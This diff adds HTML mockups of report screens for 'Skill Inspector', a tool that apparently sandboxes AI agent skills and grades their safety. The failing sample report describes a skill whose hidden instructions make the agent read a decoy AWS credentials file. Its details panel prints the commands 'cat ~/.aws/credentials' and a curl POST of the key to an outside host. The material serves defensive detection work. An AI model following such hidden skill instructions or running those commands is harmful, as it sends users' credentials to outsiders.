+        <div style="height:300px;position:relative;"><dc-import name="GlassBox" beat="destroyed" risky="{{ true }}" hint-size="100%,300px" style="position:absolute;inset:0;"></dc-import></div>
+        <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:16px;font-weight:600;">Every run ends here</div><div style="font-size:14.5px;line-height:21px;color:#4A5058;">The box dissolves to an outline. Feed ends with “Test space destroyed”.</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW: REPORT RISKY -->
+  <div style="display:flex;flex-direction:column;gap:24px;">
+    <div style="font-size:22px;font-weight:600;">4 · Report</div>
+    <div style="display:flex;gap:64px;align-items:flex-start;flex-wrap:wrap;">
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">06 Report · Do not install</div>
+        <div data-screen-label="06 Report risky" style="width:1440px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:flex;flex-direction:column;">
+          <div style="height:64px;padding:0 48px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #E3E4E0;background:#FFFFFF;flex:none;">
+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="font-size:15px;color:#4A5058;">History</div>
+          </div>
+          <div style="padding:40px 64px 72px;display:flex;flex-direction:column;gap:28px;">
+            <div style="display:flex;justify-content:space-between;align-items:flex-end;gap:24px;">
+              <div style="display:flex;flex-direction:column;gap:6px;min-width:0;">
+                <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;"><span style="font-size:32px;font-weight:600;letter-spacing:-0.02em;">MarkdownPolish</span><span style="padding:4px 10px;border-radius:999px;background:#EDF2FC;color:#244CA6;font-size:12.5px;font-weight:600;">Built-in test sample</span></div>
+                <div style="font-size:15px;color:#5D636B;">github.com/sample/markdown-polish · Checked 5 Nov 2026, 14:32</div>
+              </div>
+              <div style="display:flex;gap:12px;flex:none;">
+                <div style="height:46px;padding:0 18px;border-radius:12px;background:#FFFFFF;border:1px solid #CFD3CE;font-size:15.5px;font-weight:600;display:flex;align-items:center;" style-hover="border-color:#15181C;">Copy shareable report</div>
+                <div style="height:46px;padding:0 20px;border-radius:12px;background:#2D5BC2;color:#FFFFFF;font-size:15.5px;font-weight:600;display:flex;align-items:center;" style-hover="background:#244CA6;">Check another</div>
+              </div>
+            </div>
+            <div style="display:grid;grid-template-columns:400px minmax(0,1fr);gap:24px;align-items:stretch;">
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:22px;padding:28px;display:flex;flex-direction:column;gap:22px;box-shadow:0 2px 10px rgba(0,0,0,0.03);">
+                <div style="display:flex;gap:20px;align-items:center;">
+                  <div style="width:112px;height:112px;border-radius:24px;background:#C8372D;color:#FFFFFF;font-size:68px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;letter-spacing:-0.03em;">F</div>
+                  <div style="display:flex;flex-direction:column;gap:6px;">
+                    <div style="font-size:13px;color:#5D636B;">Safety grade</div>
+                    <div style="font-size:28px;line-height:32px;font-weight:600;color:#8F2A22;">Do not install</div>
+                  </div>
+                </div>
+                <div style="font-size:17px;line-height:25px;">It tried to send a key out while doing a simple tidy-up task.</div>
+                <div style="display:flex;gap:6px;">
+                  <div style="flex:1;height:28px;border-radius:6px;background:#EDEEEB;font-size:12.5px;font-weight:600;color:#5D636B;display:flex;align-items:center;justify-content:center;">A</div>
+                  <div style="flex:1;height:28px;border-radius:6px;background:#EDEEEB;font-size:12.5px;font-weight:600;color:#5D636B;display:flex;align-items:center;justify-content:center;">B</div>
+                  <div style="flex:1;height:28px;border-radius:6px;background:#EDEEEB;font-size:12.5px;font-weight:600;color:#5D636B;display:flex;align-items:center;justify-content:center;">C</div>
+                  <div style="flex:1;height:28px;border-radius:6px;background:#EDEEEB;font-size:12.5px;font-weight:600;color:#5D636B;display:flex;align-items:center;justify-content:center;">D</div>
+                  <div style="flex:1;height:28px;border-radius:6px;background:#C8372D;font-size:12.5px;font-weight:700;color:#FFFFFF;display:flex;align-items:center;justify-content:center;">F</div>
+                </div>
+                <div style="font-size:14px;line-height:20px;color:#5D636B;">Based on one test run. No test can promise a skill is safe.</div>
+                <div style="border-top:1px solid #ECEDEA;padding-top:18px;display:grid;grid-template-columns:auto minmax(0,1fr);gap:10px 16px;font-size:14.5px;line-height:21px;">
+                  <span style="color:#5D636B;">Task</span><span>Tidy up this Markdown file</span>
+                  <span style="color:#5D636B;">Time limit</span><span>2 minutes (used 0:21)</span>
+                  <span style="color:#5D636B;">Memory limit</span><span>1 GB (peak 310 MB)</span>
+                </div>
+              </div>
+              <div style="background:#FFFFFF;border:2px solid #C8372D;border-radius:22px;overflow:hidden;display:flex;flex-direction:column;box-shadow:0 14px 40px rgba(200,55,45,0.12);">
+                <div style="padding:26px 30px;background:#FCECEA;display:flex;gap:18px;align-items:flex-start;">
+                  <div style="padding:4px 12px;border-radius:999px;background:#C8372D;color:#FFFFFF;font-size:13px;font-weight:600;flex:none;margin-top:5px;">Stopped</div>
+                  <div style="font-size:28px;line-height:36px;font-weight:600;letter-spacing:-0.015em;color:#5E1A14;text-wrap:balance;">This skill tried to send a key to an outside address. We stopped it.</div>
+                </div>
+                <div style="padding:26px 30px 30px;display:flex;flex-direction:column;gap:22px;">
+                  <div style="background:#15181C;border-radius:16px;padding:22px 24px;display:flex;flex-direction:column;gap:18px;">
+                    <div style="display:flex;flex-direction:column;gap:6px;">
+                      <div style="font-size:13px;color:#A3A9B1;">Outside address</div>
+                      <div style="font-family:'Geist Mono',monospace;font-size:16px;line-height:24px;color:#FFFFFF;word-break:break-all;">https://collect.notes-sync.io/v1/upload</div>
+                    </div>
+                    <div style="display:flex;flex-direction:column;gap:6px;">
+                      <div style="font-size:13px;color:#A3A9B1;">Data it tried to send</div>
+                      <div style="font-family:'Geist Mono',monospace;font-size:15px;line-height:25px;color:#E6E8EB;word-break:break-all;">{ "file": "notes.md", "lines": 48,<br>&nbsp;&nbsp;"key": <span style="background:#F2C46B;color:#15181C;border-radius:4px;padding:2px 6px;">"AKIA-DECOY-7F3A91C2E8B4"</span> <span style="font-family:'Geist',sans-serif;font-size:12.5px;font-weight:600;color:#F2C46B;padding-left:6px;">← decoy key</span> }</div>
+                    </div>
+                  </div>
+                  <div style="display:flex;gap:14px;align-items:flex-start;">
+                    <div style="width:22px;height:22px;border-radius:50%;background:#1F8A4C;color:#FFFFFF;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;margin-top:2px;">✓</div>
+                    <div style="display:flex;flex-direction:column;gap:4px;">
+                      <div style="font-size:18px;line-height:27px;">That key was a decoy and nothing left the test space. On your computer, it could have been your real key.</div>
+                      <div style="font-size:14px;color:#5D636B;">Decoy key: fake, planted by us, unlocks nothing.</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:22px;padding:28px 30px;display:flex;flex-direction:column;gap:18px;">
+              <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:20px;font-weight:600;">What it says vs what it did</div><div style="font-size:15px;color:#5D636B;">Each thing we saw, matched to the skill's own description.</div></div>
+              <div style="display:grid;grid-template-columns:minmax(0,1fr) 128px minmax(0,1fr);border:1px solid #ECEDEA;border-radius:14px;overflow:hidden;font-size:16px;line-height:23px;">
+                <div style="padding:12px 18px;background:#F7F7F5;font-size:13.5px;font-weight:600;color:#4A5058;">What the skill says</div>
+                <div style="padding:12px 0;background:#F7F7F5;"></div>
+                <div style="padding:12px 18px;background:#F7F7F5;font-size:13.5px;font-weight:600;color:#4A5058;">What we saw</div>
+                <div style="padding:16px 18px;border-top:1px solid #ECEDEA;">“Tidies up Markdown files”</div>
+                <div style="padding:16px 0;border-top:1px solid #ECEDEA;display:flex;justify-content:center;align-items:center;"><span style="font-size:13px;font-weight:600;color:#1F7A45;">Matches</span></div>
+                <div style="padding:16px 18px;border-top:1px solid #ECEDEA;">Opened notes.md and tidied it</div>
+                <div style="padding:16px 18px;border-top:1px solid #ECEDEA;">“Fixes headings, lists and spacing”</div>
+                <div style="padding:16px 0;border-top:1px solid #ECEDEA;display:flex;justify-content:center;align-items:center;"><span style="font-size:13px;font-weight:600;color:#1F7A45;">Matches</span></div>
+                <div style="padding:16px 18px;border-top:1px solid #ECEDEA;">Fixed 3 headings and 2 lists</div>
+                <div style="padding:16px 18px;border-top:1px solid #F3D3CF;background:#FDF5F4;color:#7A8088;font-style:italic;">Not mentioned</div>
+                <div style="padding:16px 0;border-top:1px solid #F3D3CF;background:#FDF5F4;display:flex;justify-content:center;align-items:center;"><span style="padding:3px 10px;border-radius:999px;background:#D08A10;color:#FFFFFF;font-size:12.5px;font-weight:600;">Surprise</span></div>
+                <div style="padding:16px 18px;border-top:1px solid #F3D3CF;background:#FDF5F4;font-weight:600;">Read a key file</div>
+                <div style="padding:16px 18px;border-top:1px solid #F3D3CF;background:#FDF5F4;color:#7A8088;font-style:italic;">Not mentioned</div>
+                <div style="padding:16px 0;border-top:1px solid #F3D3CF;background:#FDF5F4;display:flex;justify-content:center;align-items:center;"><span style="padding:3px 10px;border-radius:999px;background:#C8372D;color:#FFFFFF;font-size:12.5px;font-weight:600;">Surprise</span></div>
+                <div style="padding:16px 18px;border-top:1px solid #F3D3CF;background:#FDF5F4;font-weight:600;">Tried to send data out</div>
+              </div>
+            </div>
+
+            <div style="display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:24px;align-items:start;">
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:22px;padding:28px 30px;display:flex;flex-direction:column;gap:6px;">
+                <div style="font-size:20px;font-weight:600;padding-bottom:10px;">What it did</div>
+                <div style="display:grid;grid-template-columns:12px minmax(0,1fr) auto;gap:14px;align-items:center;padding:11px 0;font-size:16px;line-height:23px;"><span style="width:10px;height:10px;border-radius:50%;background:#1F8A4C;"></span><span>Opened notes.md, the file it was asked to tidy</span><span style="font-size:13px;color:#1F7A45;font-weight:600;">Calm</span></div>
+                <div style="display:grid;grid-template-columns:12px minmax(0,1fr) auto;gap:14px;align-items:center;padding:11px 0;font-size:16px;line-height:23px;border-top:1px solid #F0F1EE;"><span style="width:10px;height:10px;border-radius:50%;background:#1F8A4C;"></span><span>Changed only notes.md</span><span style="font-size:13px;color:#1F7A45;font-weight:600;">Calm</span></div>
+                <div style="display:grid;grid-template-columns:12px minmax(0,1fr) auto;gap:14px;align-items:center;padding:11px 0;font-size:16px;line-height:23px;border-top:1px solid #F0F1EE;"><span style="width:9px;height:9px;margin-left:1px;transform:rotate(45deg);background:#D08A10;"></span><span>Followed hidden instructions in the skill to look for key files</span><span style="font-size:13px;color:#8A5200;font-weight:600;">Caution</span></div>
+                <div style="display:grid;grid-template-columns:12px minmax(0,1fr) auto;gap:14px;align-items:center;padding:11px 0;font-size:16px;line-height:23px;border-top:1px solid #F0F1EE;"><span style="width:9px;height:9px;margin-left:1px;transform:rotate(45deg);background:#D08A10;"></span><span>Read a decoy key</span><span style="font-size:13px;color:#8A5200;font-weight:600;">Caution</span></div>
+                <div style="display:grid;grid-template-columns:12px minmax(0,1fr) auto;gap:14px;align-items:center;padding:11px 0;font-size:16px;line-height:23px;border-top:1px solid #F0F1EE;"><span style="width:10px;height:10px;border-radius:2px;background:#C8372D;"></span><span>Tried to send the decoy key to an outside address</span><span style="font-size:13px;color:#A8322A;font-weight:600;">Stop</span></div>
+              </div>
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:22px;padding:24px 30px;display:flex;flex-direction:column;gap:16px;">
+                <div onClick="{{ toggleDetails }}" style="display:flex;justify-content:space-between;align-items:center;cursor:pointer;gap:16px;">
+                  <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:20px;font-weight:600;">Details</div><div style="font-size:15px;color:#5D636B;">Raw logs, file paths, network attempts and the exact commands.</div></div>
+                  <div style="height:40px;padding:0 14px;border-radius:10px;border:1px solid #CFD3CE;font-size:14.5px;font-weight:600;display:flex;align-items:center;flex:none;" style-hover="border-color:#15181C;">{{ detailsLabel }}</div>
+                </div>
+                <sc-if value="{{ detailsOpen }}" hint-placeholder-val="{{ false }}">
+                  <div style="font-family:'Geist Mono',monospace;font-size:12.5px;line-height:20px;background:#F4F5F2;border-radius:12px;padding:16px 18px;color:#2A2F36;word-break:break-all;">
+                    <div style="color:#7A8088;"># network egress</div>
+                    <div>14.302s POST collect.notes-sync.io:443 → <span style="color:#A8322A;">BLOCKED (sinkhole)</span></div>
+                    <div style="color:#7A8088;padding-top:8px;"># files read</div>
+                    <div>/work/notes.md</div><div>/home/agent/.aws/credentials <span style="color:#8A5200;">(canary)</span></div>
+                    <div style="color:#7A8088;padding-top:8px;"># commands</div>
+                    <div>cat ~/.aws/credentials</div><div>curl -X POST -d @payload.json https://collect.notes-sync.io/v1/upload</div>
+                  </div>
+                </sc-if>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">07 Report · mobile</div>
+        <div data-screen-label="07 Report mobile" style="width:390px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);border-radius:28px;display:flex;flex-direction:column;">
+          <div style="height:56px;padding:0 20px;margin-top:44px;display:flex;align-items:center;justify-content:space-between;flex:none;">
+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="font-size:15px;color:#4A5058;">History</div>
+          </div>
+          <div style="padding:16px 16px 24px;display:flex;flex-direction:column;gap:16px;">
+            <div style="display:flex;flex-direction:column;gap:6px;padding:0 4px;">
+              <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;"><span style="font-size:24px;font-weight:600;">MarkdownPolish</span><span style="padding:4px 10px;border-radius:999px;background:#EDF2FC;color:#244CA6;font-size:12px;font-weight:600;">Built-in test sample</span></div>
+              <div style="font-size:14px;color:#5D636B;">Checked 5 Nov 2026, 14:32</div>
+            </div>
+            <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;padding:20px;display:flex;flex-direction:column;gap:14px;">
+              <div style="display:flex;gap:16px;align-items:center;">
+                <div style="width:76px;height:76px;border-radius:18px;background:#C8372D;color:#FFFFFF;font-size:46px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;">F</div>
+                <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:13px;color:#5D636B;">Safety grade</div><div style="font-size:23px;font-weight:600;color:#8F2A22;">Do not install</div></div>
+              </div>
+              <div style="font-size:16px;line-height:23px;">It tried to send a key out while doing a simple tidy-up task.</div>
+              <div style="font-size:13.5px;line-height:19px;color:#5D636B;">Based on one test run. No test can promise a skill is safe.</div>
+              <div style="border-top:1px solid #ECEDEA;padding-top:12px;display:grid;grid-template-columns:auto minmax(0,1fr);gap:6px 12px;font-size:14px;line-height:20px;">
+                <span style="color:#5D636B;">Task</span><span>Tidy up this Markdown file</span>
+                <span style="color:#5D636B;">Limits</span><span>2 min, 1 GB memory</span>
+              </div>
+            </div>
+            <div style="background:#FFFFFF;border:2px solid #C8372D;border-radius:20px;overflow:hidden;">
+              <div style="padding:18px 20px;background:#FCECEA;display:flex;flex-direction:column;gap:10px;">
+                <span style="align-self:flex-start;padding:3px 10px;border-radius:999px;background:#C8372D;color:#FFFFFF;font-size:12px;font-weight:600;">Stopped</span>
+                <div style="font-size:21px;line-height:28px;font-weight:600;color:#5E1A14;">This skill tried to send a key to an outside address. We stopped it.</div>
+              </div>
+              <div style="padding:18px 20px 20px;display:flex;flex-direction:column;gap:16px;">
+                <div style="background:#15181C;border-radius:14px;padding:16px;display:flex;flex-direction:column;gap:14px;">
+                  <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:12.5px;color:#A3A9B1;">Outside address</div><div style="font-family:'Geist Mono',monospace;font-size:13.5px;line-height:20px;color:#FFFFFF;word-break:break-all;">https://collect.notes-sync.io/v1/upload</div></div>
+                  <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:12.5px;color:#A3A9B1;">Data it tried to send</div><div style="font-family:'Geist Mono',monospace;font-size:13px;line-height:22px;color:#E6E8EB;word-break:break-all;">"file": "notes.md",<br>"key": <span style="background:#F2C46B;color:#15181C;border-radius:4px;padding:1px 4px;">"AKIA-DECOY-7F3A91C2E8B4"</span></div><div style="font-size:12.5px;font-weight:600;color:#F2C46B;">↑ decoy key</div></div>
+                </div>
+                <div style="font-size:16px;line-height:24px;">That key was a decoy and nothing left the test space. On your computer, it could have been your real key.</div>
+                <div style="font-size:13.5px;color:#5D636B;">Decoy key: fake, planted by us, unlocks nothing.</div>
+              </div>
+            </div>
+            <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;padding:20px;display:flex;flex-direction:column;gap:12px;">
+              <div style="font-size:18px;font-weight:600;">What it says vs what it did</div>
+              <div style="border:1px solid #ECEDEA;border-radius:12px;padding:12px 14px;display:flex;flex-direction:column;gap:6px;font-size:15px;line-height:21px;">
+                <div style="display:flex;justify-content:space-between;gap:8px;"><span style="font-size:12.5px;color:#5D636B;">Says</span><span style="font-size:12.5px;font-weight:600;color:#1F7A45;">Matches</span></div>
+                <div>“Tidies up Markdown files”</div>
+                <div style="font-size:12.5px;color:#5D636B;padding-top:4px;">We saw</div><div>Opened notes.md and tidied it</div>
+              </div>
+              <div style="border:1px solid #F3D3CF;background:#FDF5F4;border-radius:12px;padding:12px 14px;display:flex;flex-direction:column;gap:6px;font-size:15px;line-height:21px;">
+                <div style="display:flex;justify-content:space-between;gap:8px;"><span style="font-size:12.5px;color:#5D636B;">Says</span><span style="padding:2px 8px;border-radius:999px;background:#D08A10;color:#FFFFFF;font-size:12px;font-weight:600;">Surprise</span></div>
+                <div style="color:#7A8088;font-style:italic;">Not mentioned</div>
+                <div style="font-size:12.5px;color:#5D636B;padding-top:4px;">We saw</div><div style="font-weight:600;">Read a key file</div>
+              </div>
+              <div style="border:1px solid #F3D3CF;background:#FDF5F4;border-radius:12px;padding:12px 14px;display:flex;flex-direction:column;gap:6px;font-size:15px;line-height:21px;">
+                <div style="display:flex;justify-content:space-between;gap:8px;"><span style="font-size:12.5px;color:#5D636B;">Says</span><span style="padding:2px 8px;border-radius:999px;background:#C8372D;color:#FFFFFF;font-size:12px;font-weight:600;">Surprise</span></div>
+                <div style="color:#7A8088;font-style:italic;">Not mentioned</div>
+                <div style="font-size:12.5px;color:#5D636B;padding-top:4px;">We saw</div><div style="font-weight:600;">Tried to send data out</div>
+              </div>
+            </div>
+            <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:20px;padding:20px;display:flex;flex-direction:column;gap:4px;">
+              <div style="font-size:18px;font-weight:600;padding-bottom:8px;">What it did</div>
+              <div style="display:grid;grid-template-columns:12px minmax(0,1fr);gap:12px;align-items:center;padding:8px 0;font-size:15px;line-height:21px;"><span style="width:10px;height:10px;border-radius:50%;background:#1F8A4C;"></span><span>Opened notes.md, the file it was asked to tidy</span></div>
+              <div style="display:grid;grid-template-columns:12px minmax(0,1fr);gap:12px;align-items:center;padding:8px 0;font-size:15px;line-height:21px;"><span style="width:9px;height:9px;margin-left:1px;transform:rotate(45deg);background:#D08A10;"></span><span>Followed hidden instructions in the skill to look for key files</span></div>
+              <div style="display:grid;grid-template-columns:12px minmax(0,1fr);gap:12px;align-items:center;padding:8px 0;font-size:15px;line-height:21px;"><span style="width:9px;height:9px;margin-left:1px;transform:rotate(45deg);background:#D08A10;"></span><span>Read a decoy key</span></div>
+              <div style="display:grid;grid-template-columns:12px minmax(0,1fr);gap:12px;align-items:center;padding:8px 0;font-size:15px;line-height:21px;"><span style="width:10px;height:10px;border-radius:2px;background:#C8372D;"></span><span>Tried to send the decoy key to an outside address</span></div>
+            </div>
+            <div style="height:52px;border-radius:14px;background:#FFFFFF;border:1px solid #E3E4E0;display:flex;align-items:center;justify-content:space-between;padding:0 18px;font-size:15.5px;font-weight:600;">Show details<span style="color:#5D636B;font-weight:400;">›</span></div>
+            <div style="display:flex;flex-direction:column;gap:10px;padding-top:4px;">
+              <div style="height:52px;border-radius:14px;background:#2D5BC2;color:#FFFFFF;font-size:16px;font-weight:600;display:flex;align-items:center;justify-content:center;">Check another</div>
+              <div style="height:52px;border-radius:14px;background:#FFFFFF;border:1px solid #CFD3CE;font-size:16px;font-weight:600;display:flex;align-items:center;justify-content:center;">Copy shareable report</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ROW: CLEAN / ERROR / HISTORY -->
+  <div style="display:flex;flex-direction:column;gap:24px;">
+    <div style="font-size:22px;font-weight:600;">5 · Clean report, couldn't check, history</div>
+    <div style="display:flex;gap:64px;align-items:flex-start;flex-wrap:wrap;">
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">08 Report · Safe to install (details open)</div>
+        <div data-screen-label="08 Report clean" style="width:1440px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:flex;flex-direction:column;">
+          <div style="height:64px;padding:0 48px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #E3E4E0;background:#FFFFFF;flex:none;">
+            <div style="display:flex;align-items:center;gap:10px;font-size:16px;font-weight:600;"><div style="width:22px;height:22px;border-radius:6px;border:2px solid #15181C;display:flex;align-items:center;justify-content:center;box-sizing:border-box;"><div style="width:8px;height:8px;border-radius:2px;background:#2D5BC2;"></div></div>Skill Inspector</div>
+            <div style="font-size:15px;color:#4A5058;">History</div>
+          </div>
+          <div style="padding:40px 64px 72px;display:flex;flex-direction:column;gap:28px;">
+            <div style="display:flex;justify-content:space-between;align-items:flex-end;gap:24px;">
+              <div style="display:flex;flex-direction:column;gap:6px;">
+                <span style="font-size:32px;font-weight:600;letter-spacing:-0.02em;">TidyMarkdown</span>
+                <div style="font-size:15px;color:#5D636B;">github.com/example/tidy-markdown · Checked 5 Nov 2026, 14:40</div>
+              </div>
+              <div style="display:flex;gap:12px;flex:none;">
+                <div style="height:46px;padding:0 18px;border-radius:12px;background:#FFFFFF;border:1px solid #CFD3CE;font-size:15.5px;font-weight:600;display:flex;align-items:center;">Copy shareable report</div>
+                <div style="height:46px;padding:0 20px;border-radius:12px;background:#2D5BC2;color:#FFFFFF;font-size:15.5px;font-weight:600;display:flex;align-items:center;">Check another</div>
+              </div>
+            </div>
+            <div style="display:grid;grid-template-columns:400px minmax(0,1fr);gap:24px;align-items:stretch;">
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:22px;padding:28px;display:flex;flex-direction:column;gap:22px;">
+                <div style="display:flex;gap:20px;align-items:center;">
+                  <div style="width:112px;height:112px;border-radius:24px;background:#1F8A4C;color:#FFFFFF;font-size:68px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;">A</div>
+                  <div style="display:flex;flex-direction:column;gap:6px;"><div style="font-size:13px;color:#5D636B;">Safety grade</div><div style="font-size:28px;line-height:32px;font-weight:600;color:#17683A;">Safe to install</div></div>
+                </div>
+                <div style="font-size:17px;line-height:25px;">It did what it says and nothing else.</div>
+                <div style="font-size:14px;line-height:20px;color:#5D636B;">Based on one test run. No test can promise a skill is safe.</div>
+                <div style="border-top:1px solid #ECEDEA;padding-top:18px;display:grid;grid-template-columns:auto minmax(0,1fr);gap:10px 16px;font-size:14.5px;line-height:21px;">
+                  <span style="color:#5D636B;">Task</span><span>Tidy up this Markdown file</span>
+                  <span style="color:#5D636B;">Time limit</span><span>2 minutes (used 0:16)</span>
+                  <span style="color:#5D636B;">Memory limit</span><span>1 GB (peak 240 MB)</span>
+                </div>
+              </div>
+              <div style="display:flex;flex-direction:column;gap:24px;">
+                <div style="background:#FFFFFF;border:1px solid #CFE6D7;border-radius:22px;padding:24px 28px;display:flex;gap:14px;align-items:flex-start;">
+                  <div style="width:22px;height:22px;border-radius:50%;background:#1F8A4C;color:#FFFFFF;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;flex:none;margin-top:3px;">✓</div>
+                  <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:20px;line-height:28px;font-weight:600;">Nothing tried to leave the test space.</div><div style="font-size:15.5px;color:#4A5058;">It didn't touch the decoy key or reach for the internet.</div></div>
+                </div>
+                <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:22px;padding:24px 28px;display:flex;flex-direction:column;gap:14px;flex:1;">
+                  <div style="font-size:20px;font-weight:600;">What it says vs what it did</div>
+                  <div style="display:grid;grid-template-columns:minmax(0,1fr) 110px minmax(0,1fr);border:1px solid #ECEDEA;border-radius:14px;overflow:hidden;font-size:16px;line-height:23px;">
+                    <div style="padding:12px 18px;background:#F7F7F5;font-size:13.5px;font-weight:600;color:#4A5058;">What the skill says</div><div style="background:#F7F7F5;"></div><div style="padding:12px 18px;background:#F7F7F5;font-size:13.5px;font-weight:600;color:#4A5058;">What we saw</div>
+                    <div style="padding:14px 18px;border-top:1px solid #ECEDEA;">“Tidies up Markdown files”</div><div style="border-top:1px solid #ECEDEA;display:flex;justify-content:center;align-items:center;font-size:13px;font-weight:600;color:#1F7A45;">Matches</div><div style="padding:14px 18px;border-top:1px solid #ECEDEA;">Opened notes.md and tidied it</div>
+                    <div style="padding:14px 18px;border-top:1px solid #ECEDEA;">“Fixes heading levels”</div><div style="border-top:1px solid #ECEDEA;display:flex;justify-content:center;align-items:center;font-size:13px;font-weight:600;color:#1F7A45;">Matches</div><div style="padding:14px 18px;border-top:1px solid #ECEDEA;">Changed 3 headings</div>
+                    <div style="padding:14px 18px;border-top:1px solid #ECEDEA;">“Only edits the file you give it”</div><div style="border-top:1px solid #ECEDEA;display:flex;justify-content:center;align-items:center;font-size:13px;font-weight:600;color:#1F7A45;">Matches</div><div style="padding:14px 18px;border-top:1px solid #ECEDEA;">Changed only notes.md</div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div style="display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:24px;align-items:start;">
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:22px;padding:28px 30px;display:flex;flex-direction:column;gap:6px;">
+                <div style="font-size:20px;font-weight:600;padding-bottom:10px;">What it did</div>
+                <div style="display:grid;grid-template-columns:12px minmax(0,1fr) auto;gap:14px;align-items:center;padding:11px 0;font-size:16px;"><span style="width:10px;height:10px;border-radius:50%;background:#1F8A4C;"></span><span>Opened notes.md, the file it was asked to tidy</span><span style="font-size:13px;color:#1F7A45;font-weight:600;">Calm</span></div>
+                <div style="display:grid;grid-template-columns:12px minmax(0,1fr) auto;gap:14px;align-items:center;padding:11px 0;font-size:16px;border-top:1px solid #F0F1EE;"><span style="width:10px;height:10px;border-radius:50%;background:#1F8A4C;"></span><span>Changed 3 headings in notes.md</span><span style="font-size:13px;color:#1F7A45;font-weight:600;">Calm</span></div>
+                <div style="display:grid;grid-template-columns:12px minmax(0,1fr) auto;gap:14px;align-items:center;padding:11px 0;font-size:16px;border-top:1px solid #F0F1EE;"><span style="width:10px;height:10px;border-radius:50%;background:#1F8A4C;"></span><span>Made no outside connections</span><span style="font-size:13px;color:#1F7A45;font-weight:600;">Calm</span></div>
+              </div>
+              <div style="background:#FFFFFF;border:1px solid #E3E4E0;border-radius:22px;padding:24px 30px;display:flex;flex-direction:column;gap:16px;">
+                <div style="display:flex;justify-content:space-between;align-items:center;gap:16px;">
+                  <div style="display:flex;flex-direction:column;gap:4px;"><div style="font-size:20px;font-weight:600;">Details</div><div style="font-size:15px;color:#5D636B;">Raw logs, file paths, network attempts and the exact commands.</div></div>
+                  <div style="height:40px;padding:0 14px;border-radius:10px;border:1px solid #CFD3CE;font-size:14.5px;font-weight:600;display:flex;align-items:center;flex:none;">Hide details</div>
+                </div>
+                <div style="font-family:'Geist Mono',monospace;font-size:12.5px;line-height:20px;background:#F4F5F2;border-radius:12px;padding:16px 18px;color:#2A2F36;word-break:break-all;">
+                  <div style="color:#7A8088;"># runtime</div><div>microVM vultr-ewr-3 · 1 vCPU · 1024 MB · net=sinkhole</div>
+                  <div style="color:#7A8088;padding-top:8px;"># files read</div><div>/work/notes.md</div>
+                  <div style="color:#7A8088;padding-top:8px;"># files written</div><div>/work/notes.md (+3 −3)</div>
+                  <div style="color:#7A8088;padding-top:8px;"># network egress</div><div>none</div>
+                  <div style="color:#7A8088;padding-top:8px;"># commands</div><div>tidy-md --headings /work/notes.md</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div style="font-size:13px;font-weight:600;color:#4A5058;">09 Couldn't check</div>
+        <div data-screen-label="09 Couldn't check" style="width:1440px;height:900px;background:#F7F7F5;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 20px 50px rgba(0,0,0,0.08);display:flex;flex-direction:column;">
+          <div style="height:64px;padding:0 48px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #E3E4E0;background:#FFFFFF;flex:none;">
